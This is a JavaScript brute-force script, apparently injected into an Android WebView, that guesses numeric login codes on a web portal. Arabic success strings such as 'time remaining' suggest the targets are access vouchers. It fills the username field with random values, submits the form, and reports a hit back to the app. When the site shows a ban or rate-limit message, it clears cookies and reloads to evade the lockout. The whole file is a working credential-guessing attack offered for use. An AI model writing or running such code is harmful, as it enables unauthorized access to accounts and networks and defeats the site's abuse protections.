(function() {
    const CFG = window.FINDER_CONFIG;
    if (!CFG || window.__cracking) return;
    window.__cracking = true;
    let stopped = false;
    window.stopFinder = function() { stopped = true; window.__cracking = false; };

    const id = CFG.id;
    const log = (m) => { try { window["AndroidBridge" + id].log(m); } catch(e) {} };

    async function run() {
        log('▶ بدء');
        
        const maxVal = Math.pow(10, CFG.digits) - 1;
        let done = 0;

        for (let i = 0; i < CFG.attempts; i++) {
            if (stopped) { log('⏹ توقف'); break; }

            const input = document.querySelector('input[name="username"]');
            const btn = document.querySelector('.login-submit') || document.querySelector('button[type="submit"]');
            
            if (!input) {
                await new Promise(r => setTimeout(r, 1000));
                continue; 
            }

            const num = Math.floor(Math.random() * (maxVal + 1));
            const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;

            // 🔒 انتظار الدور (القفل الزمني العام)
            // الشاشة لن ترسل أي طلب حتى ينتهي وقت "التأخير" من آخر طلب في أي شاشة أخرى
            log('⏳ في انتظار الدور...');
            while (!stopped) {
                let canGo = window["AndroidBridge" + id].requestTurn(CFG.pause || 1500);
                if (canGo) break;
                await new Promise(r => setTimeout(r, 100));
            }
            if (stopped) break;

            // الآن جاء دور هذه الشاشة
            input.value = v;
            input.dispatchEvent(new Event('input', {bubbles:true}));
            input.dispatchEvent(new Event('change', {bubbles:true}));

            done++;
            try { window["AndroidBridge" + id].progress(done, CFG.attempts, v); } catch(e) {}
            log('🔍 ' + v);

            if (btn) { try { btn.click(); } catch(e) {} }

            await new Promise(r => setTimeout(r, 1500));

            const pageText = document.body.innerText;

            if (pageText.includes("انت محظور") || pageText.includes("تجاوزت العدد المسموح")) {
                log('🛑 حظر! مسح الجلسة وتجديد المتصفح...');
                try { window["AndroidBridge" + id].clearCookies(); } catch(e) {}
                setTimeout(() => { window.location.reload(); }, 500);
                return;
            }

            if (window.location.href.includes("status") || pageText.includes("تم تسجيل الدخول") || pageText.includes("الوقت المتبقي")) {
                log('✅✅✅ نجاح: ' + v);
                try { window["AndroidBridge" + id].found(v, pageText); } catch(e) {}
                window.__cracking = false;
                return;
            }

            const errDiv = document.getElementById('error');
            if (errDiv && errDiv.innerText.trim() !== "") {
                log('📄 ' + errDiv.innerText.trim());
            }
        }
        log('❌ انتهى');
        window.__cracking = false;
    }

    setTimeout(run, 300);
})();
